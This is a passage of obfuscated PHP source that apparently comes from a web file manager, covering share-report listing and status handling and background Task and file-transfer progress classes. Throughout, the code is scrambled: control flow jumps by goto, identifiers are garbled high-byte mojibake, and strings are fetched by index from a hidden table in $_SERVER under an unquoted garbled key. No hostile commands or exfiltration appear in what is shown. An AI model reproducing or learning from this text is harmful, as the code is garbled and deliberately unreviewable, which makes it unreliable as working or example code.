$F‡√ÒÇÊéŸ[$Dï∞ôë÷ﬂÿ[401]]); return Model($Dï∞ôë÷ﬂÿ[2221])->add($Cæ¬ïòØ™ª); } public function reportList($FªòåÖÃﬂ’) { goto B’‡ó‡ÛúÇ; AË◊ÇáàÑÊ: if (isset($FªòåÖÃﬂ’[$DØõÎóûËÂ[29]]) && in_array($FªòåÖÃﬂ’[$DØõÎóûËÂ[29]], array($DØõÎóûËÂ[83], $DØõÎóûËÂ[2226], $DØõÎóûËÂ[2227], $DØõÎóûËÂ[2228], $DØõÎóûËÂ[1903]))) { $b˜÷ÜÚêäè[$DØõÎóûËÂ[29]] = $FªòåÖÃﬂ’[$DØõÎóûËÂ[29]]; } if (isset($FªòåÖÃﬂ’[$DØõÎóûËÂ[692]]) && in_array($FªòåÖÃﬂ’[$DØõÎóûËÂ[692]], array($DØõÎóûËÂ[464], $DØõÎóûËÂ[83], $DØõÎóûËÂ[2226], $DØõÎóûËÂ[2227]))) { $b˜÷ÜÚêäè[$DØõÎóûËÂ[692]] = $FªòåÖÃﬂ’[$DØõÎóûËÂ[692]]; } $E∞ô‰´å§ê = Input::get($DØõÎóûËÂ[404], $DØõÎóûËÂ[7], $DØõÎóûËÂ[2225], array($DØõÎóûËÂ[2162], $DØõÎóûËÂ[400])); goto D∆ª´å≤ïâ; EÚ¡ÀÒ˘»“: if (empty($Cä´∫éõéŒ[$DØõÎóûËÂ[350]])) { return array(); } $this->_listDataApply($Cä´∫éõéŒ[$DØõÎóûËÂ[350]]); return $Cä´∫éõéŒ; goto dµÊ‡‡Ëá ; D∆ª´å≤ïâ: $Cô àÆ‹≥· = array($DØõÎóûËÂ[398] => $DØõÎóûËÂ[399], $DØõÎóûËÂ[400] => $DØõÎóûËÂ[401]); $Bﬂﬁ†©ªÔ™ = $DØõÎóûËÂ[2229] . $Cô àÆ‹≥·[$E∞ô‰´å§ê]; $Cä´∫éõéŒ = Model($DØõÎóûËÂ[2221])->where($b˜÷ÜÚêäè)->order($Bﬂﬁ†©ªÔ™)->selectPage(20); goto EÚ¡ÀÒ˘»“; B’‡ó‡ÛúÇ: $DØõÎóûËÂ =& $_SERVER[¯èãÄπµ]; $b˜÷ÜÚêäè = array(); if ($FªòåÖÃﬂ’[$DØõÎóûËÂ[705]]) { $Bã√©¶—ë = $FªòåÖÃﬂ’[$DØõÎóûËÂ[706]] ? $FªòåÖÃﬂ’[$DØõÎóûËÂ[706]] : strtotime(date($DØõÎóûËÂ[2223])); $b˜÷ÜÚêäè[$DØõÎóûËÂ[183]] = array($DØõÎóûËÂ[317], array($FªòåÖÃﬂ’[$DØõÎóûËÂ[705]], $Bã√©¶—ë)); } goto AË◊ÇáàÑÊ; dµÊ‡‡Ëá : } public function reportStatus($eá–ûêΩôﬂ) { goto a…Àıÿ‚¡•; d£‘•©≤ª·: if (!$EÍ–¢óìêÃ) { return !1; } $DÖ÷Ë◊ıπŒ = array($bíú‰ØúÃ◊[692] => $eá–ûêΩôﬂ[$bíú‰ØúÃ◊[692]]); if ($eá–ûêΩôﬂ[$bíú‰ØúÃ◊[692]] == $bíú‰ØúÃ◊[2227] && $EÍ–¢óìêÃ[$bíú‰ØúÃ◊[692]] == $bíú‰ØúÃ◊[2227]) { $DÖ÷Ë◊ıπŒ[$bíú‰ØúÃ◊[692]] = 0; } goto b¿≠ëµÌº√; a…Àıÿ‚¡•: $bíú‰ØúÃ◊ =& $_SERVER[¯èãÄπµ]; $a¯›—ª›Òæ = array($bíú‰ØúÃ◊[363] => $eá–ûêΩôﬂ[$bíú‰ØúÃ◊[363]]); $EÍ–¢óìêÃ = Model($bíú‰ØúÃ◊[2221])->where($a¯›—ª›Òæ)->field($bíú‰ØúÃ◊[2230])->find(); goto d£‘•©≤ª·; dˆ•õ√âÓ¬: return $CÒ’‹Ñ®‘Ÿ; goto Bû™ôÂïê∫; b¿≠ëµÌº√: $CÒ’‹Ñ®‘Ÿ = Model($bíú‰ØúÃ◊[2221])->where($a¯›—ª›Òæ)->save($DÖ÷Ë◊ıπŒ); if ($eá–ûêΩôﬂ[$bíú‰ØúÃ◊[692]] == $bíú‰ØúÃ◊[2226]) { if ($EÍ–¢óìêÃ[$bíú‰ØúÃ◊[415]] != $bíú‰ØúÃ◊[464] && $this->shareFileMeta($EÍ–¢óìêÃ[$bíú‰ØúÃ◊[415]])) { $this->shareFileMeta($EÍ–¢óìêÃ[$bíú‰ØúÃ◊[415]], 0); } $this->remove($EÍ–¢óìêÃ[$bíú‰ØúÃ◊[437]]); return !0; } if ($CÒ’‹Ñ®‘Ÿ && $eá–ûêΩôﬂ[$bíú‰ØúÃ◊[692]] == $bíú‰ØúÃ◊[2227]) { $AÇœ‰‹Ù¥≥ = $DÖ÷Ë◊ıπŒ[$bíú‰ØúÃ◊[692]] == $bíú‰ØúÃ◊[2227] ? 1 : 0; $this->shareFileMeta($EÍ–¢óìêÃ[$bíú‰ØúÃ◊[415]], $AÇœ‰‹Ù¥≥); $this->removeByFile($EÍ–¢óìêÃ[$bíú‰ØúÃ◊[415]]); } goto dˆ•õ√âÓ¬; Bû™ôÂïê∫: } private function removeByFile($Fä–Œ„õÎ∫) { goto aÿ…¡≤å–∑; bßø æ¿´Ø: $a⁄Ö◊ﬂúÀ¶ = array_to_keyvalue($A≈≈ÇÕ¬∞∏, $C€Óü…ÑÿÉ[33], $C€Óü…ÑÿÉ[437]); $this->remove($a⁄Ö◊ﬂúÀ¶); goto aÁÓÂÖõ‚‡; aÿ…¡≤å–∑: $C€Óü…ÑÿÉ =& $_SERVER[¯èãÄπµ]; $A≈≈ÇÕ¬∞∏ = Model($C€Óü…ÑÿÉ[755])->where(array($C€Óü…ÑÿÉ[415] => $Fä–Œ„õÎ∫))->field($C€Óü…ÑÿÉ[365])->select(); $c–ø∆Ÿê”é = array_to_keyvalue($A≈≈ÇÕ¬∞∏, $C€Óü…ÑÿÉ[33], $C€Óü…ÑÿÉ[365]); goto f†…Ï¨ã“û; f†…Ï¨ã“û: $e¨πÉ…‹Û´ = array($C€Óü…ÑÿÉ[365] => array($C€Óü…ÑÿÉ[7], $c–ø∆Ÿê”é), $C€Óü…ÑÿÉ[442] => 1); $A≈≈ÇÕ¬∞∏ = Model($C€Óü…ÑÿÉ[2064])->where($e¨πÉ…‹Û´)->field($C€Óü…ÑÿÉ[437])->select(); if (empty($A≈≈ÇÕ¬∞∏)) { return; } goto bßø æ¿´Ø; aÁÓÂÖõ‚‡: } private function shareFileMeta($F ≥…ı∏ç, $EÜ÷¥¨˜Ù’ = null) { $e°ööÀ∆çƒ =& $_SERVER[¯èãÄπµ]; $b·¶ø∂Û…ù = array($e°ööÀ∆çƒ[415] => $F ≥…ı∏ç, $e°ööÀ∆çƒ[89] => $e°ööÀ∆çƒ[2231]); if (is_null($EÜ÷¥¨˜Ù’)) { return Model($e°ööÀ∆çƒ[2232])->where($b·¶ø∂Û…ù)->find(); } $b·¶ø∂Û…ù[$e°ööÀ∆çƒ[355]] = $EÜ÷¥¨˜Ù’; Model($e°ööÀ∆çƒ[2232])->add($b·¶ø∂Û…ù, array(), !0); } } goto FäØëÔ£ä®; E˘“•€õíπ: class Task { const STATYS_STOP = "\163\164\157\x70"; const STATYS_RUNNING = "\x72\x75\156\x6e\151\x6e\147"; const STATYS_KILL = "\x6b\151\x6c\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($A Ã‘ÑøóØ, $E°íà≈√Ÿπ = '', $bö«ï•ËﬂÁ = 0, $BåﬁÛàÌÈË = '') { goto c≤Î¡û∫ßÇ; A«¯¿»à«æ: Hook::trigger($B∂Œ„áä€˘[1435], $this->task); $this->task[$B∂Œ„áä€˘[1429]] = timeFloat(); self::valueSet($this->task[$B∂Œ„áä€˘[363]], $this->task); goto e„•ÍÕÖô‡; c≤Î¡û∫ßÇ: $B∂Œ„áä€˘ =& $_SERVER[¯èãÄπµ]; if (self::get($A Ã‘ÑøóØ)) { return; } $this->task = array($B∂Œ„áä€˘[363] => $A Ã‘ÑøóØ, $B∂Œ„áä€˘[1424] => USER_ID, $B∂Œ„áä€˘[1332] => $BåﬁÛàÌÈË, $B∂Œ„áä€˘[29] => $E°íà≈√Ÿπ, $B∂Œ„áä€˘[982] => $B∂Œ„áä€˘[33], $B∂Œ„áä€˘[980] => $bö«ï•ËﬂÁ, $B∂Œ„áä€˘[992] => 0, $B∂Œ„áä€˘[1425] => 0, $B∂Œ„áä€˘[1426] => 0, $B∂Œ„áä€˘[1427] => timeFloat(), $B∂Œ„áä€˘[1428] => 0, $B∂Œ„áä€˘[1429] => 0, $B∂Œ„áä€˘[1430] => 0, $B∂Œ„áä€˘[1431] => 0, $B∂Œ„áä€˘[692] => $B∂Œ„áä€˘[1388]); goto FùÑ“ Õ≤‰; FùÑ“ Õ≤‰: Hook::bind($B∂Œ„áä€˘[1390], array($this, $B∂Œ„áä€˘[1432])); Hook::bind($B∂Œ„áä€˘[1433], array($this, $B∂Œ„áä€˘[1434])); $this->startAfter(); goto A«¯¿»à«æ; e„•ÍÕÖô‡: } public function end() { goto Bòäˆ Ìèí; c€Ω˜éê”ê: $eÑéÌûáâÂ = timeFloat() - $this->task[$Aº©∆ç—ëä[1427]]; self::log($Aº©∆ç—ëä[1436] . $this->task[$Aº©∆ç—ëä[363]] . $Aº©∆ç—ëä[1437] . $eÑéÌûáâÂ . $Aº©∆ç—ëä[1438]); Hook::unbind($Aº©∆ç—ëä[1390], array($this, $Aº©∆ç—ëä[1432])); goto BãÂÍÊ®¿ù; BãÂÍÊ®¿ù: Hook::unbind($Aº©∆ç—ëä[1433], array($this, $Aº©∆ç—ëä[1434])); $this->endAfter(); $this->task = !1; goto fÑ∂—‚Ã√í; Bòäˆ Ìèí: $Aº©∆ç—ëä =& $_SERVER[¯èãÄπµ]; if (!$this->task) { return; } if ($this->task[$Aº©∆ç—ëä[1429]]) { self::valueSet($this->task[$Aº©∆ç—ëä[363]], !1); } goto c€Ω˜éê”ê; fÑ∂—‚Ã√í: } public function update($a›Ô‘õ˘⁄¥ = 0) { goto B∞ °çﬁ°; B∞ °çﬁ°: $E»¿ÌŒ‰Üù =& $_SERVER[¯èãÄπµ]; $Aåáä≈¨ºƒ =& $this->task; if (!$Aåáä≈¨ºƒ) { return; } goto Eíú∫Úøÿ«; fû™Ö÷Õ’ : $Aåáä≈¨ºƒ[$E»¿ÌŒ‰Üù[692]] = $F•úÈŸÇõÉ ? $F•úÈŸÇõÉ : $Aåáä≈¨ºƒ[$E»¿ÌŒ‰Üù[692]]; $Aåáä≈¨ºƒ[$E»¿ÌŒ‰Üù[1430]] = $cÆ´∏è©è†[$E»¿ÌŒ‰Üù[1430]] ? $cÆ´∏è©è†[$E»¿ÌŒ‰Üù[1430]] : 0; $Aåáä≈¨ºƒ[$E»¿ÌŒ‰Üù[1429]] = timeFloat(); goto DÙ§‘å®ü; Eíú∫Úøÿ«: $Aåáä≈¨ºƒ[$E»¿ÌŒ‰Üù[992]] += $a›Ô‘õ˘⁄¥; $Aåáä≈¨ºƒ[$E»¿ÌŒ‰Üù[1428]] = timeFloat(); if ($Aåáä≈¨ºƒ[$E»¿ÌŒ‰Üù[980]]) { if ($Aåáä≈¨ºƒ[$E»¿ÌŒ‰Üù[980]] < $Aåáä≈¨ºƒ[$E»¿ÌŒ‰Üù[992]]) { $Aåáä≈¨ºƒ[$E»¿ÌŒ‰Üù[980]] = $Aåáä≈¨ºƒ[$E»¿ÌŒ‰Üù[992]]; } $D´≈Ü·ﬁèÍ = timeFloat() - $Aåáä≈¨ºƒ[$E»¿ÌŒ‰Üù[1427]] - $Aåáä≈¨ºƒ[$E»¿ÌŒ‰Üù[1430]]; $Aåáä≈¨ºƒ[$E»¿ÌŒ‰Üù[1425]] = $Aåáä≈¨ºƒ[$E»¿ÌŒ‰Üù[992]] / $Aåáä≈¨ºƒ[$E»¿ÌŒ‰Üù[980]]; $Aåáä≈¨ºƒ[$E»¿ÌŒ‰Üù[1426]] = $Aåáä≈¨ºƒ[$E»¿ÌŒ‰Üù[992]] / $D´≈Ü·ﬁèÍ; if ($Aåáä≈¨ºƒ[$E»¿ÌŒ‰Üù[1425]] > 0) { $Aåáä≈¨ºƒ[$E»¿ÌŒ‰Üù[1431]] = $D´≈Ü·ﬁèÍ * (1 - $Aåáä≈¨ºƒ[$E»¿ÌŒ‰Üù[1425]]) / $Aåáä≈¨ºƒ[$E»¿ÌŒ‰Üù[1425]]; } $Aåáä≈¨ºƒ[$E»¿ÌŒ‰Üù[1431]] = $Aåáä≈¨ºƒ[$E»¿ÌŒ‰Üù[1431]] <= 0 ? 0 : $Aåáä≈¨ºƒ[$E»¿ÌŒ‰Üù[1431]]; } goto Bü°»‘Ùí£; DÙ§‘å®ü: Hook::trigger($E»¿ÌŒ‰Üù[1442], $Aåáä≈¨ºƒ); self::valueSet($Aåáä≈¨ºƒ[$E»¿ÌŒ‰Üù[363]], $Aåáä≈¨ºƒ); goto B◊ë¡›ÜÜ¿; Bü°»‘Ùí£: $this->updateAfter(); $E‹âÿ∂êø⁄ = 0.2; if (timeFloat() - $Aåáä≈¨ºƒ[$E»¿ÌŒ‰Üù[1429]] < $E‹âÿ∂êø⁄) { return; } goto D€≈˘ª∂ˆ›; D€≈˘ª∂ˆ›: $cÆ´∏è©è† = self::get($Aåáä≈¨ºƒ[$E»¿ÌŒ‰Üù[363]]); $F•úÈŸÇõÉ = $cÆ´∏è©è†[$E»¿ÌŒ‰Üù[692]]; if ($F•úÈŸÇõÉ == self::STATYS_KILL) { $d‚ÿ≠ß–é = array($E»¿ÌŒ‰Üù[1439] => LNG($E»¿ÌŒ‰Üù[1440]), $E»¿ÌŒ‰Üù[1034] => !1); Cache::set($E»¿ÌŒ‰Üù[1441] . $this->task[$E»¿ÌŒ‰Üù[363]], $d‚ÿ≠ß–é, 30); $this->end(); die; } else { if ($F•úÈŸÇõÉ == self::STATYS_STOP) { $C©öç®œóé = 2; $cÆ´∏è©è†[$E»¿ÌŒ‰Üù[1430]] += $C©öç®œóé; self::valueSet($Aåáä≈¨ºƒ[$E»¿ÌŒ‰Üù[363]], $cÆ´∏è©è†); sleep($C©öç®œóé); $this->update(); return; } } goto fû™Ö÷Õ’ ; B◊ë¡›ÜÜ¿: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($bÖ‘ÿÜù±ƒ) { $AâŸ‚›œ”ã =& $_SERVER[¯èãÄπµ]; Cache::set($AâŸ‚›œ”ã[1441] . $this->task[$AâŸ‚›œ”ã[363]], $bÖ‘ÿÜù±ƒ, 60); return $bÖ‘ÿÜù±ƒ; } public static function get($b§ªâ¡ç¥Â) { return self::valueGet($b§ªâ¡ç¥Â); } public static function listData() { $dî‰Â∂∂—æ = self::valueGet(); return array_sort_by($dî‰Â∂∂—æ, $_SERVER[¯èãÄπµ][1427], !0); } public static function kill($c¢í∫´©Ñº) { return self::changeStatus($c¢í∫´©Ñº, self::STATYS_KILL); } public static function stop($FøÆâÈÎ≥É) { return self::changeStatus($FøÆâÈÎ≥É, self::STATYS_STOP); } public static function restart($f∫ÙúÂã®ò) { return self::changeStatus($f∫ÙúÂã®ò, self::STATYS_RUNNING); } public static function killAll() { $E¢‘ˆØΩë§ =& $_SERVER[¯èãÄπµ]; $AƒΩ‘∑Ã˜ª = self::listData(); foreach ($AƒΩ‘∑Ã˜ª as $aîØ¶Ú‘Æó) { self::kill($aîØ¶Ú‘Æó[$E¢‘ˆØΩë§[363]]); } sleep(2); foreach ($AƒΩ‘∑Ã˜ª as $aîØ¶Ú‘Æó) { self::valueSet($aîØ¶Ú‘Æó[$E¢‘ˆØΩë§[363]], !1); } } private static function changeStatus($f©ﬁ¨ØÇµù, $AŒè§Œ⁄ãê) { goto D∫û¶‹∂ùú; Bú‰Ø£‰¡ : $a‘ﬂæÿ„á÷[$AïãêÎ“÷Ù[692]] = $AŒè§Œ⁄ãê; self::valueSet($f©ﬁ¨ØÇµù, $a‘ﬂæÿ„á÷); self::log($AïãêÎ“÷Ù[1443] . $a‘ﬂæÿ„á÷[$AïãêÎ“÷Ù[363]] . $AïãêÎ“÷Ù[1444] . $AŒè§Œ⁄ãê); goto b∏£«°Ì≈ò; b∏£«°Ì≈ò: return !0; goto B√Óµúá÷Õ; D∫û¶‹∂ùú: $AïãêÎ“÷Ù =& $_SERVER[¯èãÄπµ]; $a‘ﬂæÿ„á÷ = self::valueGet($f©ﬁ¨ØÇµù); if (!$a‘ﬂæÿ„á÷) { return !1; } goto Bú‰Ø£‰¡ ; B√Óµúá÷Õ: } public static function valueGet($dÁ‹±ó·Øå = false) { $e±«¥∑àç® =& $_SERVER[¯èãÄπµ]; if ($dÁ‹±ó·Øå) { $f∫´ÿõ¿îù = Model($e±«¥∑àç®[395])->where(array($e±«¥∑àç®[89] => $dÁ‹±ó·Øå, $e±«¥∑àç®[29] => $e±«¥∑àç®[1445]))->find(); return $f∫´ÿõ¿îù ? json_decode($f∫´ÿõ¿îù[$e±«¥∑àç®[355]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($Eß®Û±€—Ö = false) { goto AùÇˆ¬ëªŒ; B°≠åóÆ∏˘: return $bôŒ°•€πé; goto bé≠åé°—™; f‘é†ÌÙ†Ü: $bôŒ°•€πé = Model($dËâ‚¥è∏ñ[395])->where($bÈ‹ã”Â»¨)->select(); $bôŒ°•€πé = $bôŒ°•€πé ? $bôŒ°•€πé : array(); foreach ($bôŒ°•€πé as $EâÉÇÛÿª÷ => $F´â∫˜æ‰ë) { $bôŒ°•€πé[$EâÉÇÛÿª÷] = json_decode($F´â∫˜æ‰ë[$dËâ‚¥è∏ñ[355]], !0); } goto B°≠åóÆ∏˘; AùÇˆ¬ëªŒ: $dËâ‚¥è∏ñ =& $_SERVER[¯èãÄπµ]; $bÈ‹ã”Â»¨ = array($dËâ‚¥è∏ñ[29] => $dËâ‚¥è∏ñ[1445]); if ($Eß®Û±€—Ö) { $bÈ‹ã”Â»¨[$dËâ‚¥è∏ñ[1424]] = $Eß®Û±€—Ö; } goto f‘é†ÌÙ†Ü; bé≠åé°—™: } public static function valueSet($AÖıëò§®é, $f§∆ﬂáØ›¢) { goto A‹Íµ⁄óî¨; B◊–Œä√¥Ñ: Model($f≥†Û‚Ùôâ[395])->add($AŸèìã©ß∂, array(), !0); goto C∂Â€ÜÛô’; DõΩ≠‹ªÜï: if (!$FƒÑ¢µÖ—Œ) { ob_start(); var_dump($f§∆ﬂáØ›¢); $cô∏¬Ï÷°‡ = ob_get_clean(); self::log($f≥†Û‚Ùôâ[1446] . json_encode_force($cô∏¬Ï÷°‡)); } if (!$AÖıëò§®é || !$f§∆ﬂáØ›¢[$f≥†Û‚Ùôâ[363]]) { return !1; } $AŸèìã©ß∂ = array($f≥†Û‚Ùôâ[29] => $f≥†Û‚Ùôâ[1445], $f≥†Û‚Ùôâ[1424] => USER_ID, $f≥†Û‚Ùôâ[89] => $AÖıëò§®é, $f≥†Û‚Ùôâ[355] => $FƒÑ¢µÖ—Œ); goto B◊–Œä√¥Ñ; A‹Íµ⁄óî¨: $f≥†Û‚Ùôâ =& $_SERVER[¯èãÄπµ]; if (!$f§∆ﬂáØ›¢) { return Model($f≥†Û‚Ùôâ[395])->where(array($f≥†Û‚Ùôâ[89] => $AÖıëò§®é, $f≥†Û‚Ùôâ[29] => $f≥†Û‚Ùôâ[1445]))->delete(); } $FƒÑ¢µÖ—Œ = json_encode($f§∆ﬂáØ›¢); goto DõΩ≠‹ªÜï; C∂Â€ÜÛô’: } public static function log($a¬Üà©‡›ì) { write_log($a¬Üà©‡›ì, $_SERVER[¯èãÄπµ][1447]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto fÑÛﬁ⁄√ØÈ; aÒÍÉ®’çô: Hook::bind($D¬Ö¨ÎÛ¥Õ[1458], array($this, $D¬Ö¨ÎÛ¥Õ[1459])); Hook::bind($D¬Ö¨ÎÛ¥Õ[528], array($this, $D¬Ö¨ÎÛ¥Õ[1460])); $this->sourceModelCopyFlag = !1; goto a∞åô˘øç…; cÍìÍü ««: Hook::bind($D¬Ö¨ÎÛ¥Õ[1448], array($this, $D¬Ö¨ÎÛ¥Õ[1449])); Hook::bind($D¬Ö¨ÎÛ¥Õ[1450], array($this, $D¬Ö¨ÎÛ¥Õ[1451])); Hook::bind($D¬Ö¨ÎÛ¥Õ[1452], array($this, $D¬Ö¨ÎÛ¥Õ[1453])); goto AÔ°⁄±≠ãﬂ; a∞åô˘øç…: Hook::bind($D¬Ö¨ÎÛ¥Õ[1461], array($this, $D¬Ö¨ÎÛ¥Õ[1462])); Hook::bind($D¬Ö¨ÎÛ¥Õ[1463], array($this, $D¬Ö¨ÎÛ¥Õ[1464])); Hook::bind($D¬Ö¨ÎÛ¥Õ[1465], array($this, $D¬Ö¨ÎÛ¥Õ[1466])); goto Dı¿∑π⁄á≠; f∂£∏∞ÔÕÎ: if (!$EÀ¨Ú‚äÓ…[$D¬Ö¨ÎÛ¥Õ[1332]]) { $EÀ¨Ú‚äÓ…[$D¬Ö¨ÎÛ¥Õ[1332]] = LNG($D¬Ö¨ÎÛ¥Õ[1473]); } goto dË»™®‹“†; bÙ«ı≠…›Û: Hook::bind($D¬Ö¨ÎÛ¥Õ[539], array($this, $D¬Ö¨ÎÛ¥Õ[1456])); Hook::bind($D¬Ö¨ÎÛ¥Õ[505], array($this, $D¬Ö¨ÎÛ¥Õ[1457])); Hook::bind($D¬Ö¨ÎÛ¥Õ[502], array($this, $D¬Ö¨ÎÛ¥Õ[1457])); goto d‹òÑêŸ∆Ã; fÑÛﬁ⁄√ØÈ: $D¬Ö¨ÎÛ¥Õ =& $_SERVER[¯èãÄπµ]; $EÀ¨Ú‚äÓ… =& $this->task; $this->sourceCopyFolder = !1; goto cÍìÍü ««; c≠À “∏‚•: $EÀ¨Ú‚äÓ…[$D¬Ö¨ÎÛ¥Õ[982]] = $D¬Ö¨ÎÛ¥Õ[33]; $EÀ¨Ú‚äÓ…[$D¬Ö¨ÎÛ¥Õ[1471]] = $D¬Ö¨ÎÛ¥Õ[33]; $EÀ¨Ú‚äÓ…[$D¬Ö¨ÎÛ¥Õ[1472]] = 0; goto f∂£∏∞ÔÕÎ; Dı¿∑π⁄á≠: $EÀ¨Ú‚äÓ…[$D¬Ö¨ÎÛ¥Õ[1467]] = LNG($D¬Ö¨ÎÛ¥Õ[1468]); $EÀ¨Ú‚äÓ…[$D¬Ö¨ÎÛ¥Õ[1469]] = 0; $EÀ¨Ú‚äÓ…[$D¬Ö¨ÎÛ¥Õ[1470]] = 0; goto c≠À “∏‚•; AÔ°⁄±≠ãﬂ: Hook::bind($D¬Ö¨ÎÛ¥Õ[535], array($this, $D¬Ö¨ÎÛ¥Õ[1454])); Hook::bind($D¬Ö¨ÎÛ¥Õ[536], array($this, $D¬Ö¨ÎÛ¥Õ[1455])); Hook::bind($D¬Ö¨ÎÛ¥Õ[538], array($this, $D¬Ö¨ÎÛ¥Õ[1456])); goto bÙ«ı≠…›Û; d‹òÑêŸ∆Ã: Hook::bind($D¬Ö¨ÎÛ¥Õ[507], array($this, $D¬Ö¨ÎÛ¥Õ[1457])); Hook::bind($D¬Ö¨ÎÛ¥Õ[509], array($this, $D¬Ö¨ÎÛ¥Õ[1457])); Hook::bind($D¬Ö¨ÎÛ¥Õ[511], array($this, $D¬Ö¨ÎÛ¥Õ[1457])); goto aÒÍÉ®’çô; dË»™®‹“†: } protected function endAfter() { goto A¥ÜèΩùãı; c“™ã≤å∑£: Hook::unbind($AÖÇá“∫Ñ“[1452], array($this, $AÖÇá“∫Ñ“[1453])); Hook::unbind($AÖÇá“∫Ñ“[535], array($this, $AÖÇá“∫Ñ“[1454])); Hook::unbind($AÖÇá“∫Ñ“[536], array($this, $AÖÇá“∫Ñ“[1455])); goto E±âêÎîëô; A¥ÜèΩùãı: $AÖÇá“∫Ñ“ =& $_SERVER[¯èãÄπµ]; Hook::unbind($AÖÇá“∫Ñ“[1448], array($this, $AÖÇá“∫Ñ“[1449])); Hook::unbind($AÖÇá“∫Ñ“[1450], array($this, $AÖÇá“∫Ñ“[1451])); goto c“™ã≤å∑£; aé˘èùËÁπ: Hook::unbind($AÖÇá“∫Ñ“[502], array($this, $AÖÇá“∫Ñ“[1457])); Hook::unbind($AÖÇá“∫Ñ“[507], array($this, $AÖÇá“∫Ñ“[1457])); Hook::unbind($AÖÇá“∫Ñ“[509], array($this, $AÖÇá“∫Ñ“[1457])); goto eÎ•çßøŒö; eÎ•çßøŒö: Hook::unbind($AÖÇá“∫Ñ“[511], array($this, $AÖÇá“∫Ñ“[1457])); Hook::unbind($AÖÇá“∫Ñ“[1458], array($this, $AÖÇá“∫Ñ“[1459])); Hook::unbind($AÖÇá“∫Ñ“[528], array($this, $AÖÇá“∫Ñ“[1460])); goto cù»àŒﬂé÷; cù»àŒﬂé÷: Hook::unbind($AÖÇá“∫Ñ“[1461], array($this, $AÖÇá“∫Ñ“[1462])); Hook::unbind($AÖÇá“∫Ñ“[1463], array($this, $AÖÇá“∫Ñ“[1464])); Hook::unbind($AÖÇá“∫Ñ“[1465], array($this, $AÖÇá“∫Ñ“[1466])); goto fß©∑û÷⁄ß; E±âêÎîëô: Hook::unbind($AÖÇá“∫Ñ“[538], array($this, $AÖÇá“∫Ñ“[1456])); Hook::unbind($AÖÇá“∫Ñ“[539], array($this, $AÖÇá“∫Ñ“[1456])); Hook::unbind($AÖÇá“∫Ñ“[505], array($this, $AÖÇá“∫Ñ“[1457])); goto aé˘èùËÁπ; fß©∑û÷⁄ß: } public function copyMoveStart($FñËÊ±ííå, $Cé—É„óÂü, $bŸˆëèÖ”Ÿ, $dÓ˜¿‡ã˜“) { } public function updateAfter() { goto dÂŸˆä⁄Ö›; D∏ÒÚΩÜ¯◊: if ($this->sourceModelCopyFlag) { return; } $fÎöŸÇ†ŒÛ = 0; if ($FŸèÁ‹Í∏ë[$AæõôÒÃ¶ñ[1471]] == $AæõôÒÃ¶ñ[1042]) { $fÎöŸÇ†ŒÛ = $FŸèÁ‹Í∏ë[$AæõôÒÃ¶ñ[1470]] * 0.5; } else { if ($FŸèÁ‹Í∏ë[$AæõôÒÃ¶ñ[1471]] == $AæõôÒÃ¶ñ[102]) { $fÎöŸÇ†ŒÛ = $FŸèÁ‹Í∏ë[$AæõôÒÃ¶ñ[1470]] * 0.5 + $FŸèÁ‹Í∏ë[$AæõôÒÃ¶ñ[1469]] * 0.5; } } goto aõüÁ·⁄àü; dÂŸˆä⁄Ö›: $AæõôÒÃ¶ñ =& $_SERVER[¯èãÄπµ]; $FŸèÁ‹Í∏ë =& $this->task; if (!$FŸèÁ‹Í∏ë[$AæõôÒÃ¶ñ[701]]) { return; } goto D∏ÒÚΩÜ¯◊; aõüÁ·⁄àü: $FŸèÁ‹Í∏ë[$AæõôÒÃ¶ñ[1425]] = ($FŸèÁ‹Í∏ë[$AæõôÒÃ¶ñ[1474]] + $fÎöŸÇ†ŒÛ) / $FŸèÁ‹Í∏ë[$AæõôÒÃ¶ñ[701]]; if ($FŸèÁ‹Í∏ë[$AæõôÒÃ¶ñ[1425]] > 0) { $aâü√ÜÉûË = timeFloat() - $FŸèÁ‹Í∏ë[$AæõôÒÃ¶ñ[1427]] - $FŸèÁ‹Í∏ë[$AæõôÒÃ¶ñ[1430]]; $FŸèÁ‹Í∏ë[$AæõôÒÃ¶ñ[1431]] = $aâü√ÜÉûË * (1 - $FŸèÁ‹Í∏ë[$AæõôÒÃ¶ñ[1425]]) / $FŸèÁ‹Í∏ë[$AæõôÒÃ¶ñ[1425]]; } goto B…ÀÂÀ¡»¡; B…ÀÂÀ¡»¡: } public function addPath($cã≈ø˘√ôö) { goto CáííË¢àÔ; A«â‹”íóá: if ($bıØÊ±ËÈ≈[$eßΩá–Ω∞¢[29]] == $eßΩá–Ω∞¢[163]) { $d˘ÌÓÉáÚı[$eßΩá–Ω∞¢[980]] += 1; } else { $d˘ÌÓÉáÚı[$eßΩá–Ω∞¢[980]] += $bıØÊ±ËÈ≈[$eßΩá–Ω∞¢[80]][$eßΩá–Ω∞¢[78]]; if ($bıØÊ±ËÈ≈[$eßΩá–Ω∞¢[365]]) { $d˘ÌÓÉáÚı[$eßΩá–Ω∞¢[980]] += $bıØÊ±ËÈ≈[$eßΩá–Ω∞¢[80]][$eßΩá–Ω∞¢[79]] + 1; } } $d˘ÌÓÉáÚı[$eßΩá–Ω∞¢[701]] += $bıØÊ±ËÈ≈[$eßΩá–Ω∞¢[77]]; $this->update(); goto f•ÇÜ¯—Éä; fä˘†µÏ†ó: $bıØÊ±ËÈ≈ = IO::infoWithChildren($cã≈ø˘√ôö); $dºÊä… ⁄Ω = $d˘ÌÓÉáÚı[$eßΩá–Ω∞¢[1475]] ? $d˘ÌÓÉáÚı[$eßΩá–Ω∞¢[1475]][$eßΩá–Ω∞¢[1476]] : 0; $d˘ÌÓÉáÚı[$eßΩá–Ω∞¢[1475]] = array($eßΩá–Ω∞¢[1476] => $dºÊä… ⁄Ω + 1, $eßΩá–Ω∞¢[382] => $bıØÊ±ËÈ≈[$eßΩá–Ω∞¢[28]], $eßΩá–Ω∞¢[75] => $bıØÊ±ËÈ≈[$eßΩá–Ω∞¢[75]], $eßΩá–Ω∞¢[462] => $bıØÊ±ËÈ≈[$eßΩá–Ω∞¢[462]] ? $bıØÊ±ËÈ≈[$eßΩá–Ω∞¢[462]] : $bıØÊ±ËÈ≈[$eßΩá–Ω∞¢[75]]); goto A«â‹”íóá; CáííË¢àÔ: $eßΩá–Ω∞¢ =& $_SERVER[¯èãÄπµ]; if (!$cã≈ø˘√ôö) { return; } $d˘ÌÓÉáÚı =& $this->task; goto 